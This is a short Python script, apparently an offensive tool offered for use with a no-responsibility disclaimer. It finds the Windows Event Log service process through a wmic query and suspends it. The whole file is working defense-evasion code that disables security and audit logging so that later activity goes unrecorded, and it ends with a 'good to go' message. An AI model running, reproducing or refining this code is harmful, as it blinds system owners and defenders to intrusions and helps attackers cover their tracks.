import psutil
import subprocess
import re

# Tool created by "Reza Sarvani"
# I Am NOT RESPONSIBLE For Any Of Your Actions With This Tool


command = 'wmic process get ProcessID,Commandline /VALUE'

output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)

out = output.stdout.read().decode("utf-8").replace("\r\r\n\r\r\n\r\r\n","\n")
PID = ""
FP = False
for line in out.split("\n"):
    if FP==True:
        x = re.search("\d+", line)
        PID = x.group(0)
        break
    if "-s EventLog" in line:
        FP = True

try:
    p = psutil.Process(int(PID))
    p.suspend()
    print("You Are Good To Go...!")
except:
    print("No Process ID Found! You Sure You Have Enough Priviledge?")